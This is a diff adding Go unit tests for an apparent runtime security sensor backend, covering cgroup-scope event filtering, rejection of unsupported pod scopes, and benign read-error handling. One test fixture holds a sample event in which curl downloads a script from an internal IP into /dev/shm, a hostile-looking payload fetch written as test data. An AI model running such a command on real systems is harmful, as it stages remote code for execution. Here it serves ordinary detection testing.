@@ -182,6 +182,62 @@ func TestBackendFiltersByContainerScope(t *testing.T) {
 	}
 }
 
+func TestBackendFiltersByCgroupScope(t *testing.T) {
+	dir := t.TempDir()
+	policyPath := filepath.Join(dir, "policy.yaml")
+	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	eventPath := filepath.Join(dir, "events.jsonl")
+	rawOther := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":"other-cgroup"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
+	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"kubepods.slice/workload-a.scope"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
+	if err := os.WriteFile(eventPath, []byte(rawOther+"\n"+rawNode+"\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	backend := NewBackend(policyPath, eventPath, "test")
+	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
+		ScopeType:     "cgroup",
+		ScopeSelector: "kubepods.slice/workload-a",
+	})
+	if err != nil {
+		t.Fatalf("Subscribe() error = %v", err)
+	}
+	var got []eventv1.EventKind
+	for ev := range events {
+		got = append(got, ev.SensorEvent.GetKind())
+		if ev.SensorEvent.GetProc().GetCgroup() != "kubepods.slice/workload-a.scope" {
+			t.Fatalf("cgroup = %q", ev.SensorEvent.GetProc().GetCgroup())
+		}
+	}
+	if len(got) != 1 || got[0] != eventv1.EventKind_EVENT_KIND_EXEC {
+		t.Fatalf("got kinds %v, want one EXEC", got)
+	}
+}
+
+func TestBackendRejectsUnsupportedMetadataScopes(t *testing.T) {
+	dir := t.TempDir()
+	policyPath := filepath.Join(dir, "policy.yaml")
+	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	backend := NewBackend(policyPath, "events.jsonl", "test")
+	err := backend.Apply(context.Background(), contract.CollectionIntent{
+		ScopeType:     "pod",
+		ScopeSelector: "pod-a",
+	})
+	if err == nil || !strings.Contains(err.Error(), `scope "pod" is not supported`) {
+		t.Fatalf("Apply() error = %v, want unsupported pod scope", err)
+	}
+	health, healthErr := backend.Health(context.Background())
+	if healthErr != nil {
+		t.Fatalf("Health() error = %v", healthErr)
+	}
+	if !strings.Contains(health.LastError, `scope "pod" is not supported`) {
+		t.Fatalf("health = %+v", health)
+	}
+}
+
 func TestBackendRecordsDroppedEvents(t *testing.T) {
 	dir := t.TempDir()
 	policyPath := filepath.Join(dir, "policy.yaml")
@@ -289,6 +345,22 @@ func TestBackendManagedEventCommandRecordsDroppedEvents(t *testing.T) {
 		t.Fatalf("health = %+v", health)
 	}
 }
+
+func TestBenignEventSourceReadErrorIgnored(t *testing.T) {
+	if !isBenignEventSourceReadError(ioEOFError("read |0: file already closed")) {
+		t.Fatal("expected file already closed to be benign")
+	}
+	if !isBenignEventSourceReadError(ioEOFError("read |0: closed pipe")) {
+		t.Fatal("expected closed pipe to be benign")
+	}
+	if isBenignEventSourceReadError(ioEOFError("unexpected EOF")) {
+		t.Fatal("unexpected EOF should not be benign")
+	}
+}
+
+type ioEOFError string
+
+func (e ioEOFError) Error() string { return string(e) }
 
 func TestBackendAppliesGeneratedTracingPolicy(t *testing.T) {
 	if runtime.GOOS == "windows" {
